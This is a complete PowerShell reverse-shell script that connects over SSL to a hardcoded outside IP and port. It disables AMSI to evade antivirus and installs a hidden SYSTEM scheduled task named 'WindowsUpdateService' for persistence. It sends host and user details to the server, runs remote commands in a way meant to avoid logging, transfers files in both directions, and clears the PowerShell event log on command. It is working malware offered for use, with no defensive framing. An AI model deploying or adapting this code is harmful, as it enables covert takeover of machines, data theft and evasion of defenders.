# Enhanced Reverse Shell with SSL Encryption, Persistence and Stealth
$serverIP = "147.185.221.31"  # UPDATE WITH YOUR SERVER IP
$serverPort = 47034
$maxRetryDelay = 300  # Maximum delay between connection attempts (5 minutes)
$minRetryDelay = 10   # Minimum delay between connection attempts

# AMSI Bypass to evade antivirus detection
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

function Get-SystemInfo {
    $hostname = $env:COMPUTERNAME
    $username = $env:USERNAME
    $os = (Get-WmiObject Win32_OperatingSystem).Caption
    $domain = (Get-WmiObject Win32_ComputerSystem).Domain
    $ipAddress = (Test-Connection -ComputerName $env:COMPUTERNAME -Count 1).IPv4Address.IPAddressToString
    return "SYSINFO:$hostname|$username|$os|$domain|$ipAddress"
}

function Invoke-ExponentialBackoff {
    param($retryCount)
    $delay = [math]::Min($minRetryDelay * [math]::Pow(2, $retryCount), $maxRetryDelay)
    $jitter = Get-Random -Minimum 0 -Maximum ($delay * 0.2)  # Add 20% jitter
    return $delay + $jitter
}

function Install-Persistence {
    $taskName = "WindowsUpdateService"
    $taskExists = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
    
    if (-not $taskExists) {
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $(ToBase64 $MyInvocation.MyCommand.ScriptContents)"
        $trigger = New-ScheduledTaskTrigger -AtLogOn
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings
    }
}

function ToBase64 {
    param($string)
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($string)
    return [Convert]::ToBase64String($bytes)
}

function Invoke-SafeCommand {
    param($command)
    try {
        # Use .NET methods instead of iex to avoid command logging
        $scriptBlock = [ScriptBlock]::Create($command)
        $result = $scriptBlock.Invoke() 2>&1 | Out-String
    }
    catch {
        $result = "ERROR: $($_.Exception.Message)"
    }
    return $result
}

function Transfer-File {
    param($direction, $path, $content = $null)
    
    try {
        if ($direction -eq "upload" -and $content) {
            $bytes = [Convert]::FromBase64String($content)
            [System.IO.File]::WriteAllBytes($path, $bytes)
            return "File uploaded successfully to $path"
        }
        elseif ($direction -eq "download" -and (Test-Path $path)) {
            $bytes = [System.IO.File]::ReadAllBytes($path)
            return [Convert]::ToBase64String($bytes)
        }
        else {
            return "ERROR: File not found or invalid operation"
        }
    }
    catch {
        return "ERROR: $($_.Exception.Message)"
    }
}

# Main execution
$retryCount = 0
Install-Persistence

while ($true) {
    try {
        $client = New-Object System.Net.Sockets.TCPClient
        $client.Connect($serverIP, $serverPort)
        $stream = $client.GetStream()
        
        # Wrap with SSL stream for encryption
        $sslStream = New-Object System.Net.Security.SslStream($stream, $false, 
            { param($s, $c, $ch, $e) return $true })
        $sslStream.AuthenticateAsClient($serverIP)
        
        $writer = New-Object System.IO.StreamWriter($sslStream)
        $writer.AutoFlush = $true
        $reader = New-Object System.IO.StreamReader($sslStream)
        
        # Send system information
        $writer.WriteLine((Get-SystemInfo))
        $retryCount = 0  # Reset retry counter on successful connection
        
        # Command execution loop
        while ($true) {
            try {
                $command = $reader.ReadLine()
                if (-not $command) { break }
                
                # Handle special commands
                if ($command.StartsWith("download ")) {
                    $filePath = $command.Substring(9)
                    $result = Transfer-File "download" $filePath
                    $writer.WriteLine($result)
                }
                elseif ($command.StartsWith("upload ")) {
                    $parts = $command.Split(" ", 3)
                    $filePath = $parts[1]
                    $fileContent = $parts[2]
                    $result = Transfer-File "upload" $filePath $fileContent
                    $writer.WriteLine($result)
                }
                elseif ($command -eq "exit") { 
                    break 
                }
                elseif ($command -eq "clear-log") {
                    wevtutil cl "Windows PowerShell" 2>$null
                    $result = " PowerShell event log cleared"
                    $writer.WriteLine($result)
                }
                else {
                    # Execute regular command
                    $result = Invoke-SafeCommand $command
                    $writer.WriteLine($result)
                }
            }
            catch {
                # Send error but keep connection alive
                $writer.WriteLine("ERROR: $($_.Exception.Message)")
            }
        }
    }
    catch {
        # Connection failed, will retry
    }
    finally {
        if ($client) { $client.Close() }
    }
    
    # Wait with exponential backoff before reconnecting
    $delay = Invoke-ExponentialBackoff $retryCount
    Start-Sleep -Seconds $delay
    $retryCount++
}
